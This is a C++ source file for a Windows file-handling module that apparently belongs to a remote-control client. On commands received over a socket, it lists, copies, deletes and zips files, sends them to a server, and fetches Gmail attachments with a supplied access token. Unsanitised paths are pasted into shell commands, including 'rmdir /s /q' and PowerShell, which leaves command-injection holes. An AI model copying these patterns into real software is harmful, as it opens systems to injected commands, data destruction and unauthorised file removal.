#include "files_interaction.h"

// Function to convert forward slashes to backslashes (since Windows uses backslashes in file paths)
string Files::convert_to_backslashes(string str) {
	for (int i = 0; i < str.size(); i++) {
		if (str[i] == '/') {
			str[i] = '\\';
		}
	}

	return str;
}

// Function to convert /Date(1620000000000)/ to a readable date format
string Files::convert_date_format(string date) {
	string timestamp = date.substr(6, 13);
	long long timestamp_long = stoll(timestamp);
	time_t timestamp_time = timestamp_long / 1000;

	struct tm timeinfo;
	localtime_s(&timeinfo, &timestamp_time);

	char buffer[80];
	strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeinfo);

	return string(buffer);
}

// Function to convert the length of a file (in bytes) to a human-readable format
string Files::convert_file_size(long long length) {
	// If length is null, return an empty string
	if (length == 0) {
		return "";
	}

	if (length < 1024) {
		return to_string(length) + " bytes";
	}
	else if (length < 1024 * 1024) {
		return to_string(length / 1024) + " KB";
	}
	else if (length < 1024 * 1024 * 1024) {
		return to_string(length / (1024 * 1024)) + " MB";
	}
	else {
		return to_string(length / (1024 * 1024 * 1024)) + " GB";
	}
}

// Function to determine an item is a file or a folder
string Files::get_item_type(bool psiscontainer) {
	if (psiscontainer) {
		return "Directory";
	}

	return "File";
}

string Files::get_mode_type(string mode) {
	string description = "";

	if (mode[0] == 'd') {
		description += "Directory; ";
	}
	else {
		description += "File; ";
	}

	if (mode[1] == 'a') {
		description += "Archive; ";
	}
	if (mode[2] == 'r') {
		description += "Read-only; ";
	}
	if (mode[3] == 'h') {
		description += "Hidden; ";
	}
	if (mode[4] == 's') {
		description += "System; ";
	}
	if (mode[5] == 'l') {
		description += "Reparse Point (Symbolic Link or Junction); ";
	}

	// Remove the last semicolon and space if it exists
	if (!description.empty()) {
		description = description.substr(0, description.size() - 2);
	}

	return description;
}

// Function to create a file
json Files::create_file(const char* filename) {
	ofstream file(filename);

	json response = {
		{"cmd", "createff"},
		{"body", {
			{"status", "sending"},
			{"path", ""},
			{"type", "file"},
		}}
	};

	memset(buffer, 0, BUFFER_SIZE);

	if (file.is_open()) {
		log("File created successfully", SUCCESS_LOG);
		response["body"]["status"] = "success";
		response["body"]["path"] = string(filename);
	}
	else {
		log("File creation failed", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	file.close();
	return response;

}

// Function to create a folder
json Files::create_folder(const char* foldername) {
	int result = _mkdir(foldername);

	json response = {
		{"cmd", "createff"},
		{"body", {
			{"status", "sending"},
			{"path", ""},
			{"type", "folder"},
		}}
	};

	if (result == 0) {
		log("Folder created successfully", SUCCESS_LOG);
		response["body"]["status"] = "success";
		response["body"]["path"] = string(foldername);
	}
	else {
		log("Folder creation failed", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	return response;
}

// Function to move a file
json Files::move_file(const char* old_filename, const char* new_filename) {
	int result = rename(old_filename, new_filename);

	json response = {
		{"cmd", "moveff"},
		{"body", {
			{"status", "sending"},
			{"type", "file"},
			{"source", ""},
			{"destination", ""},
		}}
	};

	if (result == 0) {
		log("File moved successfully", SUCCESS_LOG);
		response["body"]["status"] = "success";
		response["body"]["source"] = string(old_filename);
		response["body"]["destination"] = string(new_filename);
	}
	else {
		log("File move failed", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	return response;
}

// Function to move a folder
json Files::move_folder(const char* old_foldername, const char* new_foldername) {
	int result = rename(old_foldername, new_foldername);

	json response = {
		{"cmd", "moveff"},
		{"body", {
			{"status", "sending"},
			{"type", "folder"},
			{"source", ""},
			{"destination", ""},
		}}
	};

	if (result == 0) {
		log("Folder moved successfully", SUCCESS_LOG);
		response["body"]["status"] = "success";
		response["body"]["source"] = string(old_foldername);
		response["body"]["destination"] = string(new_foldername);
	}
	else {
		log("Folder move failed", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	return response;
}

// Function to copy a file
json Files::copy_file(const char* old_filename, const char* new_filename) {
	ifstream source(old_filename, ios::binary);
	ofstream dest(new_filename, ios::binary);

	json response = {
		{"cmd", "copyff"},
		{"body", {
			{"status", "sending"},
			{"type", "file"},
			{"source", ""},
			{"destination", ""},
		}}
	};

	if (!source.is_open()) {
		log("Failed to open source file", ERROR_LOG);
		response["body"]["status"] = "error";
		return response;
	}

	if (!dest.is_open()) {
		log("Failed to open destination file", ERROR_LOG);
		response["body"]["status"] = "error";
		return response;
	}

	// Write the contents of the source file to the destination file
	dest << source.rdbuf();

	source.close();
	dest.close();

	log("File copied successfully", SUCCESS_LOG);
	response["body"]["status"] = "success";
	response["body"]["source"] = string(old_filename);
	response["body"]["destination"] = string(new_filename);

	return response;
}

// Function to copy a folder by executing shell command instead of using C++ code
json Files::copy_folder(const char* old_foldername, const char* new_foldername) {
	string old_foldername_str = old_foldername;
	string new_foldername_str = new_foldername;

	json response = {
		{"cmd", "copyff"},
		{"body", {
			{"status", "sending"},
			{"type", "folder"},
			{"source", ""},
			{"destination", ""},
		}}
	};

	string command = "xcopy " + convert_to_backslashes(old_foldername) + " " + convert_to_backslashes(new_foldername) + " /i /e /h /y";

	// Create a buffer to store the result of the command
	char buffer[128];
	string result;

	FILE* pipe = _popen(command.c_str(), "r");

	if (!pipe) {
		log("Couldn't start command.", ERROR_LOG);
		response["body"]["status"] = "error";
		return response;
	}

	while (fgets(buffer, 128, pipe) != NULL) {
		result += buffer;
	}

	auto returnCode = _pclose(pipe);

	if (returnCode == 0) {
		log("Folder copied successfully", SUCCESS_LOG);
		response["body"]["status"] = "success";
		response["body"]["source"] = string(old_foldername);
		response["body"]["destination"] = string(new_foldername);
	}
	else {
		log("Folder copy failed", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	return response;
}

json Files::delete_file(const char* filename) {
	int result = remove(filename);

	json response = {
		{"cmd", "deleteff"},
		{"body", {
			{"status", "sending"},
			{"path", ""},
			{"type", "file"},
		}}
	};

	if (result == 0) {
		log("File deleted successfully", SUCCESS_LOG);
		response["body"]["status"] = "success";
		response["body"]["path"] = string(filename);
	}
	else {
		log("File deletion failed", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	return response;
}

// Function to delete a folder (using the same method as copying a folder)
json Files::delete_folder(const char* foldername) {
	json response = {
		{"cmd", "deleteff"},
		{"body", {
			{"status", "sending"},
			{"path", ""},
			{"type", "folder"},
		}}
	};

	string command = "rmdir /s /q " + convert_to_backslashes(foldername);

	FILE* pipe = _popen(command.c_str(), "r");

	if (!pipe) {
		log("Couldn't start command.", ERROR_LOG);
		response["body"]["status"] = "error";
		return response;
	}

	string result;
	char buffer[128];

	while (fgets(buffer, 128, pipe) != NULL) {
		result += buffer;
	}

	auto returnCode = _pclose(pipe);

	if (returnCode == 0) {
		log("Folder deleted successfully", SUCCESS_LOG);
		response["body"]["status"] = "success";
		response["body"]["path"] = string(foldername);
	}
	else {
		log("Folder deletion failed", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	return response;
}

// Function to write the JSON content to a CSV file
bool Files::save_contents_to_csv(const char* filename, const string& result) {
	ofstream file(filename);

	if (!file.is_open()) {
		cerr << "Error opening file" << endl;
		return false;
	}

	file << "Name,LastWriteTime,Length,Mode,PSIsContainer" << endl;

	// Write the result to csv file
	json result_json = json::parse(result);

	for (auto& item : result_json) {
		cout << item["Name"] << "," << convert_date_format(item["LastWriteTime"]) << "," << convert_file_size(item["Length"]) << "," << get_mode_type(item["Mode"]) << "," << get_item_type(item["PSIsContainer"]) << endl;
		file << item["Name"] << "," << convert_date_format(item["LastWriteTime"]) << "," << convert_file_size(item["Length"]) << "," << get_mode_type(item["Mode"]) << "," << get_item_type(item["PSIsContainer"]) << endl;
	}

	file.close();
	log("Folder contents saved to CSV file", SUCCESS_LOG);

	return true;
}

// Function to list the contents of a folder
void Files::list_contents(const char* foldername) {
	json response = {
		{"cmd", "listff"},
		{"body", {
			{"status", "sending"},
			{"path", ""},
			{"filename", ""},
			{"bytes", 0},
		}}
	};

	string command =
		"powershell -command "
		"\"& { "
		"Get-ChildItem -Path '" + string(foldername) + "' -Force | ForEach-Object { "
		"if ($_.PSIsContainer) { "
		"$folderSize = (Get-ChildItem -Path $_.FullName -Recurse -Force | Measure-Object -Property Length -Sum).Sum; "
		"[PSCustomObject]@{ "
		"Name = $_.Name; "
		"LastWriteTime = $_.LastWriteTime; "
		"Length = $folderSize; "
		"Mode = $_.Mode; "
		"PSIsContainer = $_.PSIsContainer; "
		"Directory = '" + string(foldername) + "' "
		"} "
		"} else { "
		"[PSCustomObject]@{ "
		"Name = $_.Name; "
		"LastWriteTime = $_.LastWriteTime; "
		"Length = $_.Length; "
		"Mode = $_.Mode; "
		"PSIsContainer = $_.PSIsContainer; "
		"Directory = '" + string(foldername) + "' "
		"} "
		"} "
		"} | ConvertTo-Json -Depth 2 "
		"}\"";

	FILE* pipe = _popen(command.c_str(), "r");

	if (!pipe) {
		log("Couldn't start command.", ERROR_LOG);
		response["body"]["status"] = "error";
	}

	string result;
	char cmd_buffer[128];

	while (fgets(cmd_buffer, 128, pipe) != NULL) {
		result += cmd_buffer;
	}

	auto returnCode = _pclose(pipe);

	if (returnCode == 0) {
		log("Folder contents listed successfully", SUCCESS_LOG);
		response["body"]["path"] = string(foldername);

		// Write the result to csv file
		string filename = "folder_contents-" + get_current_time() + ".csv";
		int save_result = save_contents_to_csv(filename.c_str(), result);

		response["body"]["filename"] = filename;
		response["body"]["bytes"] = get_file_size(filename.c_str());

		cout << response << endl;

		memset(buffer, 0, BUFFER_SIZE);
		send(server_socket, response.dump().c_str(), BUFFER_SIZE, 0);

		if (save_result) {
			// Send the file to the client
			sendFile(filename, server_socket);
		}
	}
	else {
		log("Folder contents listing failed", ERROR_LOG);
	}
}

// Function to save an attachment to a file
json Files::save_attachment(const string& attachment, const string& path) {
	json data = json::parse(attachment);
	string email_id = data["email_id"];
	string attachment_id = data["attachment_id"];
	string access_token = data["access_token"];
	string attachment_name = data["attachment_name"];

	json response = {
		{"cmd", "saveff"},
		{"body", {
			{"status", "sending"},
			{"filename", ""},
		}}
	};

	// The URL endpoint for Gmail API
	string url = "https://gmail.googleapis.com/gmail/v1/users/me/messages/" + email_id + "/attachments/" + attachment_id;

	CURL* curl;
	CURLcode res;
	string read_buffer;

	// Initialize libcurl
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if (curl) {
		// Set the URL for the GET request
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

		// Create the Authorization header
		string auth_header = "Authorization: Bearer " + access_token;
		struct curl_slist* headers = NULL;
		headers = curl_slist_append(headers, auth_header.c_str());
		headers = curl_slist_append(headers, "Content-Type: application/json");

		// Set the headers
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

		// Set the callback function to capture the response
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

		// Perform the request
		res = curl_easy_perform(curl);

		if (res == CURLE_OK) {
			// Parse the JSON response to get the "data" field, which contains the base64-encoded attachment data
			json data_json = json::parse(read_buffer);
			string base64_data = data_json["data"];

			// Decode the base64 data
			vector<unsigned char> decoded_data = gmail_base64_decode(base64_data);

			// Save the decoded data to a file
			string filename = path + attachment_name;
			ofstream outFile(filename, ios::binary);
			outFile.write(reinterpret_cast<const char*>(decoded_data.data()), decoded_data.size());
			outFile.close();

			read_buffer.clear();

			log("Attachment saved successfully", SUCCESS_LOG);

			response["body"]["status"] = "success";
			response["body"]["filename"] = filename;
		}
		else {
			log("Failed to fetch attachment: " + string(curl_easy_strerror(res)), ERROR_LOG);
			response["body"]["status"] = "error";
		}

		curl_easy_cleanup(curl);
		curl_slist_free_all(headers);
	}

	curl_global_cleanup();

	return response;
}

// Function to send a local file to the client
void Files::get_files(vector<string>& paths) {
	// Create a zip file containing the file
	string paths_str = "";
	for (auto& path : paths) {
		paths_str += "\"" + path + "\",";
	}
	paths_str.erase(paths_str.size() - 1);
	log("Paths: " + paths_str);

	string zip_filename = "files_" + get_current_time() + ".zip";
	string command = "powershell Compress-Archive -Path " + paths_str + " -DestinationPath " + zip_filename + " -Force";
	system(command.c_str());

	log("File compressed to: " + get_file_path(zip_filename.c_str()), SUCCESS_LOG);

	json response = {
		{"cmd", "getff"},
		{"body", {
			{"status", "sending"},
			{"filename", zip_filename},
			{"path", get_file_path(zip_filename.c_str())},
			{"bytes", get_file_size(zip_filename.c_str())},
		}}
	};

	send_response_with_file(server_socket, response);
}